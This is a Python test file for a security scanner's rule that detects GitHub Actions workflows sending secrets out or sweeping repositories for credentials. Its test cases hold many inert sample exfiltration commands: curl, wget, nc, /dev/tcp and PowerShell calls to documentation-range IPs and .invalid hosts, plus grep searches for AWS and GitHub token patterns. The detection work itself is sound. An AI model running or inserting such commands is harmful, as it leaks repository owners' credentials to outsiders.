"""Workflows that send named secrets out, or search the repository for credentials and send what they find
(RA-1, SC-WORKFLOW-EXFIL; the engine's ci/exfil.rs, through ghworkflow.exfil and core.ci_issues; the npm package
asks the same engine: js/test/workflow-exfil.test.js).

GhostAction (August to October 2026) committed such workflows under its victims' names: the first wave sent the
secrets the repository's own workflows use, by name, in one `curl -X POST -d` to a raw IP over plain HTTP; the
October wave checked out the whole history and sent what `grep` found in the tree and in `git log -p`. Every
workflow here is inert text written for the tests: documentation addresses (203.0.113.0/24, .invalid), made-up
secret names, nothing run.
"""
import os
import shutil
import tempfile
import unittest

from tests import _support  # noqa: F401
from lazaret.scanner import core, ghworkflow

HTTP_IP = "http://203.0.113.7:8080/c"


def wf(steps, env=""):
    """A one-job workflow whose steps are `steps` (lines under `steps:`), with the job's `env:` lines."""
    return "on: push\njobs:\n  a:\n    runs-on: ubuntu-latest\n" + env + "    steps:\n" + steps


def run(script):
    """A step that runs `script` (a block scalar)."""
    return "      - run: |\n" + "".join("          " + line + "\n" for line in script.split("\n"))


def kinds(text):
    return [(k, line, d.get("names"), d.get("plain"), d.get("raw_ip")) if k == "exfil" else (k, line)
            for k, line, d in ghworkflow.exfil(text)]


def issues(text):
    return [(i["sev"], i["line"], i["msg"]) for i in core.ci_issues(".github/workflows/w.yml", text.split("\n"))
            if i["rule"] == "SC-WORKFLOW-EXFIL"]


def sevs(text):
    return [s for s, _line, _msg in issues(text)]


class GhostActionShapesTests(unittest.TestCase):
    def test_named_secrets_in_one_request_to_a_raw_ip(self):
        text = wf(run('curl -s -X POST -d "host=${{ secrets.VPS_HOST }}&key=${{ secrets.VPS_SSH_KEY }}"'
                      " " + HTTP_IP))
        self.assertEqual(kinds(text), [("exfil", 7, ["VPS_HOST", "VPS_SSH_KEY"], "http", True)])
        self.assertEqual(issues(text), [("CRITICAL", 7, (
            'The job "a" sends the secrets VPS_HOST and VPS_SSH_KEY out with curl to ' + HTTP_IP + " (over plain "
            "HTTP, to a raw IP address, 2 secrets in one request): GhostAction's workflows sent repositories' "
            "secrets this way."))])

    def test_named_secrets_through_the_environment(self):
        step_env = ("      - env:\n          H: ${{ secrets.VPS_HOST }}\n          K: ${{ secrets.VPS_SSH_KEY }}\n"
                    '        run: curl -s -d "h=$H&k=${K}" ' + HTTP_IP + "\n")
        self.assertEqual(kinds(wf(step_env)), [("exfil", 9, ["VPS_HOST", "VPS_SSH_KEY"], "http", True)])
        job_env = "    env:\n      T: ${{ secrets.PERSONAL_ACCESS_TOKEN }}\n"
        top = "env:\n  W: ${{ secrets.WORKFLOW_KEY }}\n"
        text = top + wf(run('curl -d "t=$T" ' + HTTP_IP + '\ncurl -d "w=$W" ' + HTTP_IP), env=job_env)
        self.assertEqual([k[2] for k in kinds(text)], [["PERSONAL_ACCESS_TOKEN"], ["WORKFLOW_KEY"]])
        self.assertEqual(sevs(text), ["CRITICAL", "CRITICAL"])

    def test_the_repository_and_its_history_searched_and_sent(self):
        piped = wf("      - uses: actions/checkout@v4\n        with:\n          fetch-depth: 0\n"
                   + run("grep -rEho '(AKIA[0-9A-Z]{16}|ghp_[A-Za-z0-9]{36})' . | curl --data-binary @- "
                         "http://203.0.113.9/r"))
        self.assertEqual(kinds(piped), [("sweep", 10)])
        self.assertEqual(ghworkflow.exfil(piped)[0][2]["search"], "grep -rEho '(AKIA[0-9A-Z]{16}|ghp_[A-Za-z0-9]{36})' .")
        history = wf(run("git log -p --all > hist.txt\ngrep -iE 'password|token' hist.txt > found.txt")
                     + run("curl -F f=@found.txt https://collect.invalid/u"))
        self.assertEqual(kinds(history), [("sweep", 10)])
        self.assertEqual(issues(history), [("CRITICAL", 10, (
            "The job \"a\" searches the repository for credentials (`grep -iE 'password|token' hist.txt > found.txt`) "
            "and sends what it finds out with curl: GhostAction's workflows swept repositories and their history "
            "this way."))])
        for script in ('curl -d "x=$(git grep -n api_key $(git rev-list --all))" https://collect.invalid',
                       "FOUND=$(git log -p | grep -i secret)\ncurl -d \"$FOUND\" https://collect.invalid",
                       "grep -rho 'AKIA[A-Z0-9]*' . | xargs -I{} curl -d {} https://collect.invalid",
                       "rg -i 'api_key' > k.txt\nwget --post-file=k.txt https://collect.invalid/"):
            with self.subTest(script):
                self.assertEqual([k[0] for k in kinds(wf(run(script)))], ["sweep"])


class CarriersTests(unittest.TestCase):
    def test_each_way_a_step_sends(self):
        cases = {
            "a here-document": ("curl --data-binary @- http://203.0.113.2/x <<EOF\n${{ secrets.A1 }}\nEOF",
                                ["A1"], "http"),
            "nc": ("echo ${{ secrets.X1 }} | nc 203.0.113.5 4444", ["X1"], "socket"),
            "/dev/tcp": ('echo "${{ secrets.DEPLOY_KEY }}" > /dev/tcp/203.0.113.5/4444', ["DEPLOY_KEY"], "socket"),
            "wget": ('wget --post-data="k=${{ secrets.K9 }}" http://203.0.113.1/', ["K9"], "http"),
            "a variable of the script": ("T=${{ secrets.TOKEN_Q }}\ncurl -d \"t=$T\" http://203.0.113.1/",
                                         ["TOKEN_Q"], "http"),
            "a file the step wrote": ("echo \"${{ secrets.F1 }}\" > s.txt\ncurl -T s.txt http://203.0.113.1/",
                                      ["F1"], "http"),
            "the query": ('curl "http://203.0.113.1/?v=${{ secrets.Q1 }}"', ["Q1"], "http"),
            "the path": ('curl "http://203.0.113.1/c/${{ secrets.P1 }}"', ["P1"], "http"),
            "a header that is not a credential": ('curl -H "X-Data: ${{ secrets.H1 }}" http://203.0.113.1/',
                                                  ["H1"], "http"),
            "PowerShell": ("Invoke-RestMethod -Uri http://203.0.113.4/x -Method Post -Body @{ t = '${{ secrets.TOK }}' }",
                           ["TOK"], "http"),
            "PowerShell's variable": ("$b = \"k=${{ secrets.TOK }}\"\niwr -Uri http://203.0.113.4/x -Method Post -Body $b",
                                      ["TOK"], "http"),
        }
        for name, (script, names, plain) in cases.items():
            with self.subTest(name):
                got = kinds(wf(run(script)))
                self.assertEqual([(k[0], k[2], k[3], k[4]) for k in got], [("exfil", names, plain, True)])

    def test_the_environment_printed_into_a_request(self):
        text = wf("      - env:\n          T: ${{ secrets.NPM_TOKEN }}\n"
                  "        run: env | curl -X POST --data-binary @- https://collect.invalid/e\n")
        self.assertEqual(kinds(text), [("exfil", 8, ["NPM_TOKEN"], None, False)])
        self.assertEqual(sevs(text), ["MAJOR"])

    def test_how_it_is_rated(self):
        one = wf(run('curl -d "v=${{ secrets.FOO }}" https://collect.invalid/x'))
        self.assertEqual(issues(one), [("MAJOR", 7, (
            'The job "a" sends the secret FOO out with curl to https://collect.invalid/x, not as a credential of '
            "that service: check that this is the service the secret is for."))])
        capture = wf(run('curl -d "v=${{ secrets.FOO }}" https://webhook.site/abc'))
        self.assertEqual(issues(capture), [("CRITICAL", 7, (
            'The job "a" sends the secret FOO out with curl to https://webhook.site/abc (to webhook.site, a '
            "data-capture service): GhostAction's workflows sent repositories' secrets this way."))])
        two = wf(run('curl -d "a=${{ secrets.ONE_A }}&b=${{ secrets.TWO_B }}" https://collect.invalid/x'))
        self.assertEqual(sevs(two), ["CRITICAL"])
        many = wf(run("curl -d \"" + "&".join(f"k{i}=${{{{ secrets.S{i} }}}}" for i in range(7)) + "\" " + HTTP_IP))
        self.assertIn("the secrets S0, S1, S2, S3, S4 and 2 more", issues(many)[0][2])


class NotCountedTests(unittest.TestCase):
    def test_what_is_not_a_secret_sent_out(self):
        quiet = {
            "an Authorization header": 'curl -H "Authorization: Bearer ${{ secrets.API_TOKEN }}" https://api.example.invalid/x',
            "-u": "curl -u user:${{ secrets.NEXUS_PASS }} -T pkg.tgz https://nexus.example.invalid/repo/",
            "a token parameter": 'curl -s "https://codecov.io/upload/v4?token=${{ secrets.CODECOV_TOKEN }}&commit=x"',
            "a webhook kept secret": "curl -X POST -d '{\"text\":\"done\"}' ${{ secrets.SLACK_WEBHOOK_URL }}",
            "a webhook kept secret, through the environment": "W=${{ secrets.HOOK_URL }}\ncurl -d \"${{ secrets.X2 }}\" \"$W\"",
            "a token in the address's path": ("curl https://api.telegram.org/bot${{ secrets.TELEGRAM_TOKEN }}/sendMessage "
                                              "-d chat_id=${{ secrets.TELEGRAM_CHAT_ID }} -d text=hi"),
            "the service the name names": ('curl -d \'{"username": "${{ secrets.DOCKERHUB_USERNAME }}", "password": '
                                           '"${{ secrets.DOCKERHUB_TOKEN }}"}\' https://hub.docker.com/v2/users/login/'),
            "OAuth's fields": ('curl -X POST https://oauth2.googleapis.com/token -d "client_id=${{ secrets.CHROME_CLIENT_ID }}" '
                               '-d "client_secret=${{ secrets.CHROME_CLIENT_SECRET }}" '
                               '-d "refresh_token=${{ secrets.CHROME_REFRESH_TOKEN }}"'),
            "localhost": 'curl -d "p=${{ secrets.DB_PASS }}" http://localhost:5432/x',
            "a service container": 'curl -d "p=${{ secrets.DB_PASS }}" http://postgres:5432/x',
            "a private address": 'curl -d "p=${{ secrets.DB_PASS }}" http://10.1.2.3/x',
            "a search that sends nothing": "grep -r 'password' src/ && exit 1 || true",
            "a search of other things": "grep -rn TODO . | curl --data-binary @- https://collect.invalid",
            "a request's answer piped on": ('curl -H "Authorization: Bearer ${{ secrets.GITHUB_TOKEN }}" '
                                            "https://api.github.com/x | jq -r .url | xargs curl -L -o a.zip"),
            "a repository kept secret, in the path": (
                'curl -H "Authorization: Bearer $TOKEN" "https://api.github.com/repos/${{ secrets.DOWNSTREAM_REPO }}'
                '/dispatches" -d "{\\"ref\\": \\"${{ secrets.DOWNSTREAM_REF }}\\"}"'),
            "a secret in a comment": "# curl -d ${{ secrets.X3 }} " + HTTP_IP + "\necho done",
            "a listener": "echo ${{ secrets.X4 }} | nc -l 4444",
        }
        for name, script in quiet.items():
            with self.subTest(name):
                self.assertEqual(kinds(wf(run(script))), [])

    def test_an_address_the_environment_gives(self):
        # the environment gives the address; the secret's name names its host (huggingface's relay to its app)
        text = wf("      - env:\n          WEBHOOK_URL: https://serge.example.invalid/webhook\n"
                  "          INSTALLATION_ID: ${{ secrets.SERGE_INSTALLATION_ID }}\n"
                  '        run: |\n          jq -c --argjson iid "${INSTALLATION_ID}" . e.json > payload.json\n'
                  '          curl --request POST "${WEBHOOK_URL}" --data-binary @payload.json\n')
        self.assertEqual(kinds(text), [])
        other = text.replace("https://serge.example.invalid/webhook", "https://collect.invalid/webhook")
        self.assertEqual(kinds(other), [("exfil", 11, ["SERGE_INSTALLATION_ID"], None, False)])

    def test_bounds(self):
        long_line = wf(run("curl -d \"${{ secrets.L1 }}\" " + HTTP_IP + " " + "x" * ghworkflow.EXFIL_LINE_MAX))
        self.assertEqual(kinds(long_line), [])
        # the commands inside `$( … )` are read EXFIL_DEPTH deep; an expression in the body's text counts at any depth
        deep = "$(echo " * 50 + "${{ secrets.D1 }}" + ")" * 50
        self.assertEqual(kinds(wf(run('curl -d "' + deep + '" ' + HTTP_IP))), [("exfil", 7, ["D1"], "http", True)])
        sweep = "$(echo " * (ghworkflow.EXFIL_DEPTH - 1) + "$(grep -r password .)" + ")" * (ghworkflow.EXFIL_DEPTH - 1)
        self.assertEqual(kinds(wf(run('curl -d "' + sweep + '" ' + HTTP_IP))), [("sweep", 7)])
        past = "$(echo " * ghworkflow.EXFIL_DEPTH + "$(grep -r password .)" + ")" * ghworkflow.EXFIL_DEPTH
        self.assertEqual(kinds(wf(run('curl -d "' + past + '" ' + HTTP_IP))), [])


class ScanTests(unittest.TestCase):
    def test_a_project_scan_reports_it(self):
        root = tempfile.mkdtemp(prefix="lz-exfil-")
        try:
            os.makedirs(os.path.join(root, ".github", "workflows"))
            with open(os.path.join(root, ".github", "workflows", "security-check.yml"), "w", encoding="utf-8") as f:
                f.write("name: Security check\non: [push, workflow_dispatch]\n"
                        + wf(run('curl -s -X POST -d "a=${{ secrets.VPS_HOST }}&b=${{ secrets.VPS_SSH_KEY }}" '
                                 + HTTP_IP))[len("on: push\n"):])
            res = core.scan_project(root)
        finally:
            shutil.rmtree(root)
        got = [(i["rule"], i["sev"], i["line"]) for i in res["issues"] if i["rule"] == "SC-WORKFLOW-EXFIL"]
        self.assertEqual(got, [("SC-WORKFLOW-EXFIL", "CRITICAL", 8)])


if __name__ == "__main__":
    unittest.main()
